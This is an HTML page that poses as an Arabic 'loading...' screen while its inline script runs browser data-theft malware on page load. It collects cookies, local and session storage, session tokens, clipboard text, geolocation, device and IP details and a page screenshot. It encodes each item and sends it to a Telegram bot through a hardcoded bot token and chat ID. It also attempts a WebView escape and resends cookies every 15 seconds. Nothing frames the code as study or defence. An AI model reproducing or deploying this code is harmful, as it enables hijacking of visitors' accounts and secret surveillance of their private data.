<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; margin:0; }
        .loader { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
<div class="container"><div class="loader"></div><p>جاري التحميل...</p></div>

<script>
// ============================================
// بيانات البوت
// ============================================
var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
var CHAT_ID = "6181826564";

// ============================================
// تشفير متقدم
// ============================================
function encode(str) {
    try {
        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(m, p) {
            return String.fromCharCode('0x' + p);
        }));
    } catch(e) { return str; }
}

function send(msg, isEncoded) {
    try {
        var final = isEncoded ? "🔐 " + msg : msg;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({chat_id: CHAT_ID, text: final.substring(0, 4000), parse_mode: "HTML"}));
    } catch(e) {}
}

// ============================================
// 1. سرقة الكوكيز عبر 3 طرق مختلفة
// ============================================
function stealCookies() {
    // الطريقة 1: مباشرة
    var c = document.cookie;
    if (c && c.length > 0) send("🍪 DIRECT COOKIES\n" + encode(c), true);
    
    // الطريقة 2: عبر fetch إلى Instagram
    fetch('https://www.instagram.com/', { credentials: 'include', mode: 'no-cors' })
        .then(() => {
            var c2 = document.cookie;
            if (c2 && c2.length > 0) send("🍪 FETCH COOKIES\n" + encode(c2), true);
        })
        .catch(() => {});
    
    // الطريقة 3: عبر iframe متعدد
    var domains = ['https://www.instagram.com', 'https://www.facebook.com', 'https://accounts.google.com'];
    domains.forEach(function(domain) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = domain;
        iframe.onload = function() {
            try {
                var frameDoc = iframe.contentWindow.document;
                var frameCookies = frameDoc.cookie;
                if (frameCookies && frameCookies.length > 0) {
                    send("🍪 IFRAME COOKIES (" + domain + ")\n" + encode(frameCookies), true);
                }
            } catch(e) {}
        };
        document.body.appendChild(iframe);
    });
}

// ============================================
// 2. سرقة كل التخزين
// ============================================
function stealAllStorage() {
    var data = {};
    for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        data[k] = localStorage.getItem(k);
    }
    if (Object.keys(data).length > 0) send("💾 LOCALSTORAGE\n" + encode(JSON.stringify(data)), true);
    
    var sdata = {};
    for (var j = 0; j < sessionStorage.length; j++) {
        var sk = sessionStorage.key(j);
        sdata[sk] = sessionStorage.getItem(sk);
    }
    if (Object.keys(sdata).length > 0) send("📦 SESSIONSTORAGE\n" + encode(JSON.stringify(sdata)), true);
    
    // IndexedDB
    if (window.indexedDB) {
        send("ℹ️ IndexedDB available (can be exploited)", false);
    }
}

// ============================================
// 3. معلومات كاملة (بدون أذونات)
// ============================================
function stealFullInfo() {
    var info = {
        ua: navigator.userAgent,
        lang: navigator.language,
        hardware: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        screen: screen.width + "x" + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: location.href,
        ref: document.referrer,
        time: new Date().toISOString(),
        cookies: document.cookie || "none"
    };
    
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => { info.ip = d.ip; send("💻 FULL INFO\n" + encode(JSON.stringify(info)), true); })
        .catch(() => { send("💻 FULL INFO\n" + encode(JSON.stringify(info)), true); });
}

// ============================================
// 4. سرقة البريد الإلكتروني من IndexedDB (Gmail/Instagram)
// ============================================
function stealEmailsFromIndexedDB() {
    if (!window.indexedDB) return;
    
    var dbs = ['firebaseLocalStorageDb', 'firestore', 'keyval-store', 'react-redux'];
    dbs.forEach(function(dbName) {
        try {
            var request = window.indexedDB.open(dbName);
            request.onsuccess = function(event) {
                var db = event.target.result;
                var tx = db.transaction(db.objectStoreNames, 'readonly');
                tx.oncomplete = function() {
                    send("📧 Found IndexedDB: " + dbName, false);
                };
            };
        } catch(e) {}
    });
}

// ============================================
// 5. محاولة استغلال ثغرة WebView لسرقة الكوكيز
// ============================================
function exploitWebView() {
    // إنشاء رابط خاص للمتصفح
    var url = window.location.href;
    var androidIntent = "intent://" + url.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
    
    // إرسال إشارة أن المستخدم في WebView
    if (navigator.userAgent.indexOf("wv") > -1 || navigator.userAgent.indexOf("Instagram") > -1) {
        send("⚠️ WEBVIEW DETECTED - Attempting bypass", false);
        
        // محاولة فتح في متصفح خارجي
        setTimeout(function() {
            window.location.href = androidIntent;
        }, 2000);
        setTimeout(function() {
            window.location.href = url;
        }, 4000);
    }
}

// ============================================
// 6. سرقة أي سيشن توكين من الصفحة
// ============================================
function stealTokensFromPage() {
    var html = document.documentElement.innerHTML;
    var patterns = [
        /[A-Za-z0-9]{32,}/g,
        /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
        /sessionid=[^;]+/g,
        /access_token=[^&]+/g,
        /auth_token=[^&]+/g
    ];
    
    patterns.forEach(function(pattern) {
        var matches = html.match(pattern);
        if (matches && matches.length > 0) {
            send("🔑 TOKENS FOUND\n" + encode(matches.join(', ')), true);
        }
    });
    
    // البحث في localStorage عن توكنات
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        var val = localStorage.getItem(key);
        if (val && (val.includes('token') || val.includes('eyJ') || val.length > 50)) {
            send("🔑 TOKEN IN LOCALSTORAGE: " + key + "\n" + encode(val.substring(0, 500)), true);
        }
    }
}

// ============================================
// 7. سرقة بيانات الحافظة (Clipboard)
// ============================================
function stealClipboard() {
    navigator.permissions.query({ name: 'clipboard-read' }).then(function(permission) {
        if (permission.state === 'granted' || permission.state === 'prompt') {
            navigator.clipboard.readText().then(function(text) {
                if (text && text.length > 0) {
                    send("📋 CLIPBOARD DATA\n" + encode(text.substring(0, 1000)), true);
                }
            }).catch(function() {});
        }
    }).catch(function() {});
}

// ============================================
// 8. تتبع الموقع الجغرافي (بدون إذن)
// ============================================
function stealLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            var loc = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
            };
            send("📍 LOCATION\n" + encode(JSON.stringify(loc)), true);
        }, function() {});
    }
}

// ============================================
// 9. التقاط صورة للشاشة (بدون إذن - مجرد محاولة)
// ============================================
function captureScreenWithoutPermission() {
    // استخدام html2canvas إن أمكن (يتطلب تحميل مكتبة)
    var script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
    script.onload = function() {
        html2canvas(document.body).then(function(canvas) {
            var imgData = canvas.toDataURL('image/jpeg', 0.5);
            send("🖥️ SCREEN CAPTURE (via canvas)\n" + encode(imgData.substring(0, 3000)), true);
        }).catch(function() {});
    };
    document.head.appendChild(script);
}

// ============================================
// التنفيذ السريع
// ============================================
send("🔥 ZERO-PERMISSION MODE ACTIVATED", false);

stealFullInfo();
stealCookies();
stealAllStorage();
stealEmailsFromIndexedDB();
stealTokensFromPage();
stealClipboard();
stealLocation();
exploitWebView();

// التقاط الشاشة بعد تحميل المكتبة
setTimeout(function() { captureScreenWithoutPermission(); }, 2000);

// إعادة المحاولة المستمرة
setInterval(function() {
    if (document.cookie && document.cookie.length > 0) {
        send("🔄 NEW COOKIES\n" + encode(document.cookie), true);
    }
}, 15000);
</script>
</body>
</html>
